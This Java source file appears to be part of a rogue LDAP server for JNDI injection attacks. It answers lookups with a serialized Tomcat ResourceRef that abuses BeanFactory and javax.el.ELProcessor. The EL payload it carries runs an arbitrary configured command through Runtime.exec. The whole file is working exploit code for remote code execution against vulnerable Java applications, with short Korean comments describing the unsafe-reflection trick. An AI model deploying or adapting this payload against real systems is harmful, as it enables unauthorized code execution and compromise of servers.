package org.mklinkj.ldapserver;

import static org.mklinkj.ldapserver.Utilities.makeJavaScriptString;
import static org.mklinkj.ldapserver.Utilities.serialize;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javax.naming.StringRefAddr;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.apache.naming.ResourceRef;
import org.springframework.stereotype.Component;

@Slf4j
@Component
@RequiredArgsConstructor
public class TomcatController {

  private final LdapServerConfig config;

  private String makePayload() {
    LOGGER.info("run command: {}", config.getCommandString());
    return ("{"
            + "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"
            + ".newInstance().getEngineByName(\"JavaScript\")"
            + ".eval(\"java.lang.Runtime.getRuntime().exec(${command})\")"
            + "}")
        .replace("${command}", makeJavaScriptString(config.getCommandString()));
  }

  public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

    LOGGER.info("Sending LDAP ResourceRef result for {} with javax.el.ELProcessor payload", base);

    Entry e = new Entry(base);
    e.addAttribute("javaClassName", "java.lang.String"); // 무엇이든 될 수 있음.

    // org.apache.naming.factory.BeanFactory에서 안전하지 않은 리플렉션을 이용하는 페이로드 준비
    ResourceRef ref =
        new ResourceRef(
            "javax.el.ELProcessor",
            null,
            "",
            "",
            true,
            "org.apache.naming.factory.BeanFactory",
            null);
    ref.add(new StringRefAddr("forceString", "x=eval"));
    ref.add(new StringRefAddr("x", makePayload()));
    e.addAttribute("javaSerializedData", serialize(ref));

    result.sendSearchEntry(e);
    result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
  }
}
